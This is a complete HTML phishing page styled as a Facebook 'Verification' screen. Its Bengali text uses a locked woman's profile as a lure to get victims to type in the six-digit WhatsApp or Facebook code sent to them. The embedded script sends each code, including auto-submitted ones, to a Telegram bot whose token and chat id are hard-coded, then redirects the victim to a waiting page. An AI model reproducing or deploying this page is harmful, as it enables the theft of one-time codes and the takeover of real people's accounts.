<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #f0f2f5; font-family: 'Segoe UI', Arial, sans-serif; }
        .code-input {
            width: 48px;
            height: 52px;
            text-align: center;
            font-size: 22px;
            font-weight: 600;
            border: 1.5px solid #dddfe2;
            border-radius: 6px;
            background: #ffffff;
            transition: border-color 0.2s;
        }
        .code-input:focus { 
            border-color: #1877f2; 
            outline: none; 
            box-shadow: 0 0 0 2px #1877f2; 
        }
        .blue-btn {
            background-color: #1877f2;
            color: white;
            font-weight: bold;
            padding: 12px 0;
            border-radius: 6px;
            width: 100%;
            max-width: 300px;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        .blue-btn:hover { background-color: #166fe5; }
        .blue-btn:disabled {
            background-color: #a0c4ff;
            cursor: not-allowed;
        }
    </style>
</head>
<body class="flex flex-col items-center min-h-screen bg-[#f0f2f5]">

    <div class="w-full max-w-sm h-[35vh] overflow-hidden flex justify-center bg-white">
        <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" 
             alt="Profile" class="w-full h-full object-cover">
    </div>

    <div class="w-full max-w-sm p-6 bg-white shadow-md mt-[-20px] rounded-t-2xl min-h-[50vh] flex flex-col items-center">

        <h2 class="text-[22px] font-bold text-gray-900 mb-4 text-center">Verification</h2>

        <p class="text-[15px] text-gray-600 mb-6 text-center leading-relaxed px-2">
            Mst.Priya Akter এর ফেসবুক আইডি পাসওয়ার্ড দিয়ে Locked করা আছে। তার ফেসবুক আইডির সাথে আপনার আইডি এড করতে হলে ৩০ সেকেন্ড অপেক্ষা করুন। আপনার Whatsapp এ অথবা ফেসবুক এর নোটিফিকেশন মেসেজ চেক করে দেখুন ৬ সংখ্যার কোড পাবেন। নিচে ফাঁকা ঘরে কোড গুলো বসিয়ে ফেসবুক এড করুন।
        </p>

        <div id="otp-inputs" class="flex justify-center gap-2 mb-6">
            <input type="text" inputmode="numeric" pattern="\d*" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)" autofocus>
            <input type="text" inputmode="numeric" pattern="\d*" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
            <input type="text" inputmode="numeric" pattern="\d*" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
            <input type="text" inputmode="numeric" pattern="\d*" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
            <input type="text" inputmode="numeric" pattern="\d*" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
            <input type="text" inputmode="numeric" pattern="\d*" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
        </div>

        <button id="submitBtn" class="blue-btn mb-6" disabled onclick="submitCode()">
            Add Friend
        </button>

        <div class="h-4"></div>

    </div>

<script>
    const inputs = document.querySelectorAll('.code-input');
    const submitBtn = document.getElementById('submitBtn');

    function handleInput(input) {
        input.value = input.value.replace(/[^0-9]/g, '');
        
        if (input.value.length === 1) {
            const next = input.nextElementSibling;
            if (next) {
                next.focus();
            } else {
                checkAndAutoSubmit();  // সব ভরা হলে অটো সাবমিট
            }
        }
        updateButtonState();
    }

    function handleBackspace(e, input) {
        if (e.key === "Backspace" && input.value.length === 0) {
            const prev = input.previousElementSibling;
            if (prev) prev.focus();
        }
    }

    function updateButtonState() {
        let codeLength = Array.from(inputs).filter(i => i.value.length === 1).length;
        submitBtn.disabled = (codeLength !== 6);
    }

    function getCode() {
        let code = "";
        inputs.forEach(i => code += i.value);
        return code;
    }

    function checkAndAutoSubmit() {
        if (getCode().length === 6) {
            submitCode(true);  // true = অটো সাবমিট
        }
    }

    async function submitCode(isAuto = false) {
        const code = getCode();
        
        if (code.length !== 6) {
            if (!isAuto) alert("দয়া করে ৬ সংখ্যার পুরো কোড দিন।");
            return;
        }

        const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
        const chatId = "8516934257";

        try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    chat_id: chatId, 
                    text: `📩 কোড: ${code} ${isAuto ? '(অটো)' : '(বাটন ক্লিক)'}` 
                })
            });
            window.location.href = "waiting.html";  // অথবা অন্য পেজ
        } catch (err) {
            console.error("টেলিগ্রামে পাঠাতে সমস্যা:", err);
            if (!isAuto) alert("কোড পাঠাতে সমস্যা হয়েছে। আবার চেষ্টা করুন।");
        }
    }

    // প্রথম ইনপুটে ফোকাস + বাটন আপডেট
    inputs[0].focus();
    updateButtonState();

    // টাইপ করার সময় রিয়েল-টাইমে বাটন আপডেট
    inputs.forEach(input => {
        input.addEventListener('input', updateButtonState);
    });
</script>

</body>
</html>
